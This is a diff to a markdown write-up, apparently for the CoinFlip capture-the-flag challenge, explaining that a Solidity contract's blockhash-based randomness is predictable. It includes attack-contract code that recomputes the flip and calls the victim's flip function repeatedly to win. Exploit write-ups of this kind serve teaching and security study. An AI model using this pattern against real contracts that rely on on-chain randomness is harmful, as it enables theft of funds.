@@ -13,7 +13,15 @@ This smart contract has a vulnerability, it's use of the public source of random
 * decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
 * Solidity and everything is publicly visible in the contract.
 */
+/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
 function flip(bool _guess) public returns (bool) {
-  // local variable blockValue is assigned using the uint256 integer from the hash of the last block number 
   uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
+  uint256 coinFlip = blockValue.div(FACTOR); 
+  bool side = coinFlip == 1 ? true : false;
+```
+  - after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
+    - the player calls this flip function 10 times in a row to win.
+
+```Solidity
+  victimContract.flip(side);
 ```
